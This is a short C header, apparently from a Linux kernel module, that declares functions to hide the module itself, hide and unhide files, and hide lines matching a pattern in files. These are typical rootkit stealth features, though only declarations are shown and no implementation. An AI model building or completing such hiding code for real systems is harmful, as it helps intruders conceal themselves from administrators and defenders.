#ifndef HIDE_H
#define HIDE_H

#include <linux/types.h>
#include <linux/dirent.h>

int hide_init(void);
void hide_exit(void);

void hide_module(void);
void hide_file(const char *name);
void unhide_file(const char *name);
void hide_line(const char *filename, const char *pattern);
void unhide_line(const char *filename, const char *pattern);

#endif /* HIDE_H */
